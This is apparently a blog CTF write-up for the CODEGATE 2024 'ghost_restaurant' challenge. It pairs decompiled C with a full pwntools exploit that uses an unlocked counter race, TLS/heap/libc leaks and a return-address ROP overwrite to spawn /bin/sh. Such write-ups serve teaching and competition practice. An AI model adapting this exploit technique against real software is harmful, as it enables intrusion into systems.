---
layout: post
title: "[CODEGATE 2024 quals] ghost_restaurant(erase shadow stack)"
comments: true
category: ctf
---

## Analysis source code

- main

```cpp
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  unsigned int i; // [rsp+Ch] [rbp-34h]
  unsigned int j; // [rsp+10h] [rbp-30h]
  unsigned int k; // [rsp+14h] [rbp-2Ch]
  int oven_number; // [rsp+18h] [rbp-28h]
  pthread_t *main_ptr; // [rsp+20h] [rbp-20h]
  char input[10]; // [rsp+2Eh] [rbp-12h] BYREF
  unsigned __int64 v10; // [rsp+38h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  main_ptr = (pthread_t *)malloc(0x50uLL);
  oveninfo_5060 = (struct oven *)malloc(0x640uLL);
  setvbuf_1489();
  pthread_mutex_init(&stru_5080, 0LL);
  pthread_cond_init(&cond, 0LL);
  while ( 1 )
  {
    pthread_mutex_lock(&stru_5080);
    while ( !dword_5010 )
      pthread_cond_wait(&cond, &stru_5080);
    pthread_mutex_lock(&mutex_5100);
    puts("0. Create New Oven");
    for ( i = 0; i < ovencnt_5068; ++i )
      printf("%d. %s\n", i + 1, (const char *)&oveninfo_5060[i]);
    printf("q. Exit\nSelect an oven number or option: ");
    __isoc99_scanf("%9s", input);
    pthread_mutex_unlock(&mutex_5100);
    if ( !strcmp(input, "q") )
      break;
    oven_number = atoi(input);
    if ( !strcmp(input, "0") )
    {
      if ( (unsigned int)ovencnt_5068 <= 3 )
      {
        printf("Enter oven name: ");
        __isoc99_scanf("%63s", &oveninfo_5060[ovencnt_5068]);
        pthread_mutex_init((pthread_mutex_t *)&oveninfo_5060[ovencnt_5068].mutex, 0LL);
        pthread_cond_init((pthread_cond_t *)&oveninfo_5060[ovencnt_5068].cond, 0LL);
        LODWORD(oveninfo_5060[ovencnt_5068].oven_status) = 0;
        pthread_create(&main_ptr[ovencnt_5068], 0LL, (void *(*)(void *))oven_thread_1928, &oveninfo_5060[ovencnt_5068]);
        ++ovencnt_5068;
      }
      else
      {
        puts("Kitchen is full.");
      }
    }
    else if ( oven_number <= 0 || ovencnt_5068 < (unsigned int)oven_number )
    {
      puts("Invalid choice.");
    }
    else
    {
      LODWORD(oveninfo_5060[oven_number - 1].oven_status) = 1;
      pthread_cond_signal((pthread_cond_t *)&oveninfo_5060[oven_number - 1].cond);
      dword_5010 = 0;
    }
    pthread_mutex_unlock(&stru_5080);
  }
  for ( j = 0; j < ovencnt_5068; ++j )
  {
    pthread_mutex_lock((pthread_mutex_t *)&oveninfo_5060[j].mutex);
    LODWORD(oveninfo_5060[j].oven_status) = -1;
    pthread_cond_signal((pthread_cond_t *)&oveninfo_5060[j].cond);
    pthread_mutex_unlock((pthread_mutex_t *)&oveninfo_5060[j].mutex);
  }
  dword_5010 = 0;
  pthread_mutex_unlock(&stru_5080);
  for ( k = 0; k < ovencnt_5068; ++k )
  {
    pthread_join(main_ptr[k], 0LL);
    pthread_mutex_destroy((pthread_mutex_t *)&oveninfo_5060[k].mutex);
    pthread_cond_destroy((pthread_cond_t *)&oveninfo_5060[k].cond);
  }
  free(oveninfo_5060);
  free(main_ptr);
  pthread_mutex_destroy(&stru_5080);
  pthread_cond_destroy(&cond);
  return 0LL;
}
```
In main, we can make oven. <br />
Oven's maximum number is 4, and each oven is managed by muti-threading. <br />
All variables that could become race conditions were mutexed. <br />
<br />

- oven_thread

```cpp
void *__fastcall oven_thread_1928(const char *a1)
{
  _QWORD *v2; // rdx
  _QWORD *v3; // rax
  __int64 v4; // rbx
  __int64 v5; // rbx
  __int64 v6; // rbx
  __int64 v7; // rbx
  __int64 v8; // rbx
  int v9; // [rsp+18h] [rbp-B8h] BYREF
  int v10; // [rsp+1Ch] [rbp-B4h] BYREF
  int i; // [rsp+20h] [rbp-B0h]
  int j; // [rsp+24h] [rbp-ACh]
  int k; // [rsp+28h] [rbp-A8h]
  int m; // [rsp+2Ch] [rbp-A4h]
  pthread_t newthread; // [rsp+30h] [rbp-A0h] BYREF
  __int64 v16; // [rsp+38h] [rbp-98h] BYREF
  const char *v17; // [rsp+40h] [rbp-90h]
  void *arg; // [rsp+48h] [rbp-88h]
  char *oven_menu[15]; // [rsp+50h] [rbp-80h] BYREF

  oven_menu[13] = (char *)__readfsqword(0x28u);
  v17 = a1;
  oven_menu[0] = "Pizza";
  oven_menu[1] = "Cake";
  oven_menu[2] = "Bread";
  oven_menu[3] = "Pie";
  memset(&oven_menu[4], 0, 64);
  arg = malloc(0x10uLL);
  memset(arg, 0, 0x10uLL);
  *(_QWORD *)arg = __readfsqword(0) - 352;
  *((_QWORD *)arg + 1) = __readfsqword(0) - 368;
  pthread_create(&newthread, 0LL, (void *(*)(void *))start_routine, arg);

  while ( 1 )
  {
    pthread_mutex_lock((pthread_mutex_t *)(v17 + 64));
    while ( !*((_DWORD *)v17 + 38) )
      pthread_cond_wait((pthread_cond_t *)(v17 + 104), (pthread_mutex_t *)(v17 + 64));
    if ( *((_DWORD *)v17 + 38) == -1 )
      break;
    if ( (__int64)__readfsqword(0xFFFFFE90) <= 0 )
    {
      printf("Oven '%s' is empty.\n", v17);
    }
    else
    {
      printf("Foods in '%s':\n", v17);
      for ( i = 0; i < (__int64)__readfsqword(0xFFFFFE90); ++i )
        printf(
          "%d. %s (cooking for %lld seconds, %lld seconds left)\n",
          (unsigned int)(i + 1),
          (const char *)(80LL * i + __readfsqword(0) - 352),
          *(_QWORD *)(__readfsqword(0) + 80LL * i - 288),
          *(_QWORD *)(__readfsqword(0) + 80LL * i - 280));
    }
    pthread_mutex_lock(&mutex_5100);
    printf(
      "Options for '%s':\n1. Insert food to oven\n2. Remove food in oven\n3. Go back to kitchen\nSelect option: ",
      v17);
    __isoc99_scanf("%d", &v9);
    pthread_mutex_unlock(&mutex_5100);
    if ( v9 == 1 )
    {
      pthread_mutex_lock(&mutex_5100);
      printf("Select food to add to '%s':\n", v17);
      for ( j = 0; j <= 3; ++j )
        printf("%d. %s\n", (unsigned int)(j + 1), oven_menu[j]);
      printf("> ");
      __isoc99_scanf("%d", &v10);
      pthread_mutex_unlock(&mutex_5100);
      if ( v10 <= 0 || v10 > 5 )
        goto LABEL_19;
      --v10;
      pthread_mutex_lock(&mutex_5100);
      printf("Enter cooking time (seconds): ");
      __isoc99_scanf("%lld", &v16);
      pthread_mutex_unlock(&mutex_5100);
      if ( (__int64)__readfsqword(0xFFFFFE90) > 3 )
      {
        puts("Oven is full.");
      }
      else
      {
        if ( v10 == 4 )
        {
          pthread_mutex_lock(&mutex_5100);
          printf("Enter food name for spacial food: ");
          read(0, (void *)(__readfsqword(0) - 352 + 80 * __readfsqword(0xFFFFFE90)), 0x40uLL);
          pthread_mutex_unlock(&mutex_5100);
        }
        else
        {
          strcpy((char *)(__readfsqword(0) - 352 + 80 * __readfsqword(0xFFFFFE90)), oven_menu[v10]);
        }
        *(_QWORD *)(__readfsqword(0) + 80 * __readfsqword(0xFFFFFE90) - 0x120) = v16;
        *(_QWORD *)(__readfsqword(0) + 80 * __readfsqword(0xFFFFFE90) - 0x118) = v16;
        puts("Whirr!");
        printf("Food '%s' added.\n", (const char *)(__readfsqword(0) - 352 + 80 * __readfsqword(0xFFFFFE90)));
        __writefsqword(0xFFFFFE90, __readfsqword(0xFFFFFE90) + 1);
      }
LABEL_39:
      pthread_mutex_unlock((pthread_mutex_t *)(v17 + 64));
    }
    else
    {
      if ( v9 != 2 )
      {
        if ( v9 == 3 )
        {
          *((_DWORD *)v17 + 38) = 0;
          dword_5010 = 1;
          pthread_cond_signal(&cond);
        }
        goto LABEL_39;
      }
      printf("Select food to remove in '%s':\n", v17);
      for ( k = 0; k < (__int64)__readfsqword(0xFFFFFE90); ++k )
        printf(
          "%d. %s (cooking for %lld seconds, %lld seconds left)\n",
          (unsigned int)(k + 1),
          (const char *)(80LL * k + __readfsqword(0) - 352),
          *(_QWORD *)(__readfsqword(0) + 80LL * k - 288),
          *(_QWORD *)(__readfsqword(0) + 80LL * k - 280));
      printf("> ");
      __isoc99_scanf("%d", &v16);
      if ( (int)v16 <= (__int64)__readfsqword(0xFFFFFE90) && (int)v16 > 0 )
      {
        LODWORD(v16) = v16 - 1;
        for ( m = v16; m < (__int64)__readfsqword(0xFFFFFE90); ++m )
        {
          v2 = (_QWORD *)(__readfsqword(0) + 80LL * m - 352);
          v3 = (_QWORD *)(__readfsqword(0) + 80LL * (m + 1) - 352);
          v4 = v3[1];
          *v2 = *v3;
          v2[1] = v4;
          v5 = v3[3];
          v2[2] = v3[2];
          v2[3] = v5;
          v6 = v3[5];
          v2[4] = v3[4];
          v2[5] = v6;
          v7 = v3[7];
          v2[6] = v3[6];
          v2[7] = v7;
          v8 = v3[9];
          v2[8] = v3[8];
          v2[9] = v8;
        }
        __writefsqword(0xFFFFFE90, __readfsqword(0xFFFFFE90) - 1);
        goto LABEL_39;
      }
LABEL_19:
      puts("Invalid choice.");
      pthread_mutex_unlock((pthread_mutex_t *)(v17 + 64));
    }
  }
  pthread_cancel(newthread);
  pthread_mutex_unlock((pthread_mutex_t *)(v17 + 64));
  return 0LL;
}
```
Each oven can cook some foods. Pizza, Cake, Bread and Pie. <br />
Also, we can make special food. If we insert input 5, we can name a food. <br />
All variables in this functions are mutexed too. <br />
This multi-threading function, so the stack is allocated and managed separately. <br />
Cooking is managed by start_routine function. <br />
We can insert cooking time, and the remaining time can be checked in 1 second increments. <br />
If one cook is over, then the list of cooking is moved to front. <br />
<br />

- start_routine

```cpp
void __fastcall __noreturn start_routine(struct oven_info *oven_info)
{
  __int64 v1; // rax
  _QWORD *v2; // rdx
  _QWORD *v3; // rax
  __int64 v4; // rbx
  __int64 v5; // rbx
  __int64 v6; // rbx
  __int64 v7; // rbx
  __int64 v8; // rbx
  unsigned int ptr; // [rsp+18h] [rbp-38h] BYREF
  int i; // [rsp+1Ch] [rbp-34h]
  int j; // [rsp+20h] [rbp-30h]
  unsigned int random_value; // [rsp+24h] [rbp-2Ch]
  struct oven_info *_oven_info; // [rsp+28h] [rbp-28h]
  FILE *stream; // [rsp+30h] [rbp-20h]
  unsigned __int64 v15; // [rsp+38h] [rbp-18h]

  v15 = __readfsqword(0x28u);
  _oven_info = oven_info;
  while ( 1 )
  {
    if ( *(__int64 *)_oven_info->total_num > 0 )
    {
      for ( i = 0; i < *(_QWORD *)_oven_info->total_num; ++i )
      {
        if ( *(__int64 *)(_oven_info->addr + 80LL * i + 72) > 0 )
        {
          v1 = _oven_info->addr + 80LL * i;
          if ( !--*(_QWORD *)(v1 + 72) )
          {
            printf("'%s' is ready!\n", (const char *)(_oven_info->addr + 80LL * i));
            stream = fopen("/dev/urandom", "r");
            if ( stream )
            {
              fread(&ptr, 4uLL, 1uLL, stream);
              random_value = ptr % 0xA + 1;
              printf("Your food got %d points\n", random_value);
            }
            fclose(stream);
            ready_14EE();
            for ( j = i; j < *(_QWORD *)_oven_info->total_num; ++j )
            {
              v2 = (_QWORD *)(_oven_info->addr + 80 * (j + 1LL));
              v3 = (_QWORD *)(_oven_info->addr + 80LL * j);
              v4 = v2[1];
              *v3 = *v2;
              v3[1] = v4;
              v5 = v2[3];
              v3[2] = v2[2];
              v3[3] = v5;
              v6 = v2[5];
              v3[4] = v2[4];
              v3[5] = v6;
              v7 = v2[7];
              v3[6] = v2[6];
              v3[7] = v7;
              v8 = v2[9];
              v3[8] = v2[8];
              v3[9] = v8;
            }
            --*(_QWORD *)_oven_info->total_num;
          }
        }
      }
    }
    sleep(1u);
  }
}
```
In this function, it refers to total food number in oven. <br />
However, unlike other functions, it doesn't use mutex for this variable. <br />
So here is vulnerability. <br />
If we can decrease total food number between checking number time and decreasing number time, we can make race condition, and total food number can be negative. <br />
<br />

## Analyze & Exploit
<br />

### leak address
- If a food in oven is over, it's array is consists with next food info.
- But if food is 4th, there isn't next food, so we can copy some address which located in there.
- We can leak tls_addr and heap_addr.
<br />

```python
for i in range(0, 4):
    insertFood(i+1, 0)

deleteFood(4)
insertSpecial(0, b'A'*0x20)
r.recvuntil(b'A'*0x20)
tls_addr = u64(r.recvn(6) + b'\x00'*2)
print(hex(tls_addr))

deleteFood(4)
insertSpecial(0, b'A'*0x28)
r.recvuntil(b'A'*0x28)
heap_addr = u64(r.recvn(6) + b'\x00'*2) - 0x960
print(hex(heap_addr))

for i in range(0, 4):
    deleteFood(1)
```
<br />

### Caculate time of ds
- For making race condition, it is a timing.
- Between insert first food and second food, race condition part must operated.
- So, I check that part's time, and if it is X seconds, I use X/2 seconds.
<br />

```python
insertFood(1,1)
r.recvuntil(b'is ready!')
start_time = time.time()
r.recvuntil(b'+++++++++++++++++++++++')
end_time = time.time()
print(end_time - start_time)
```
<br />

### Make race condition
- By using time which we calculate, we can make race condition.
- But there is so important point. If we success, number of food is overwrite by second food's time.
- We can insert negative time also, so we can access to other stack's address by this.
<br />

```python
i = 0
while 1:
    i = i+1
    print(f"*{i}*")
    insertFood(1, 1)
    sleep(0.001)
    deleteFood(1)

    insertFood(1, -32 + 7 - 15)
    r.recvuntil(b'added.\n')
    ll = r.recvline()
    print(f"*{ll}")
    if b'empty' in ll:
        break
    deleteFood(1)
```
<br />

### leak libc
- For leak libc, food's time of previous step is so important.
- All you have to do is observe the stack, find the libc address to leak, and leak it.
<br />

```python
insertSpecial(0, b'A'*0x38)
r.recvuntil(b'A'*0x38)
libc_base = u64(r.recvn(6) + b'\x00'*2) - 0x11c5c1
print(hex(libc_base))
```
<br />

### Overwrite RA of oven_thread
- Now, we know libc's address and oven_thread's return address too.
- If we leak libc's address from above of RA, then we can overwrite RA at once.
- I tried for using two oven cause of probability to get libc, but it doesn't work well.
<br />

```python
for i in range(0, 12):
    insertSpecial(0, b'\x00')
pop_rdi = libc_base + 0x10f75b
system = libc_base + 0x58740
ret = libc_base + 0x2882f
insertSpecial(0, b'/bin/sh\x00' + p64(pop_rdi) + p64(tls_addr - 352 - 80 * 26) + p64(ret)  + p64(system))
```
<br />

## Ex code

```python
from pwn import *
import time

context.log_level = 'debug'

r = remote('172.17.0.2', '8798')

def newOven(oven_name):
    r.sendlineafter(b'option: ', b'0')
    r.sendlineafter(b'name: ', oven_name)

def selectOven(oven_num):
    r.sendlineafter(b'option: ', str(oven_num).encode())

def insertFood(food_num, cook_time):
    r.sendlineafter(b'option: ', b'1')
    r.sendlineafter(b'> ', str(food_num).encode())
    r.sendlineafter(b'(seconds): ', str(cook_time).encode())

def insertSpecial(cook_time, food_name):
    insertFood(5, cook_time)
    r.sendafter(b'food: ', food_name)

def deleteFood(cook_num):
    r.sendlineafter(b'option: ', b'2')
    r.sendlineafter(b'> ', str(cook_num).encode())


#make and select oven
newOven(b'1')
selectOven(1)

#get address
for i in range(0, 4):
    insertFood(i+1, 0)

deleteFood(4)
insertSpecial(0, b'A'*0x20)
r.recvuntil(b'A'*0x20)
tls_addr = u64(r.recvn(6) + b'\x00'*2)
print(hex(tls_addr))

deleteFood(4)
insertSpecial(0, b'A'*0x28)
r.recvuntil(b'A'*0x28)
heap_addr = u64(r.recvn(6) + b'\x00'*2) - 0x960
print(hex(heap_addr))

for i in range(0, 4):
    deleteFood(1)

#calculate time of ds
#insertFood(1,1)
#r.recvuntil(b'is ready!')
#start_time = time.time()
#r.recvuntil(b'+++++++++++++++++++++++')
#end_time = time.time()
#print(end_time - start_time)


#make race condition
i = 0
while 1:
    i = i+1
    print(f"*{i}*")
    insertFood(1, 1)
    sleep(0.001)
    deleteFood(1)

    insertFood(1, -32 + 7 - 15)
    r.recvuntil(b'added.\n')
    ll = r.recvline()
    print(f"*{ll}")
    if b'empty' in ll:
        break
    deleteFood(1)

print(hex(tls_addr))
print(hex(heap_addr))

#leak libc
insertSpecial(0, b'A'*0x38)
r.recvuntil(b'A'*0x38)
libc_base = u64(r.recvn(6) + b'\x00'*2) - 0x11c5c1
print(hex(libc_base))
pause()

#overwrite RA of oven_thread
for i in range(0, 12):
    insertSpecial(0, b'\x00')
pop_rdi = libc_base + 0x10f75b
system = libc_base + 0x58740
ret = libc_base + 0x2882f
insertSpecial(0, b'/bin/sh\x00' + p64(pop_rdi) + p64(tls_addr - 352 - 80 * 26) + p64(ret)  + p64(system))

pause()

#exit
r.sendlineafter(b'option: ', b'3')
r.sendlineafter(b'option: ', b'q')

r.interactive()
```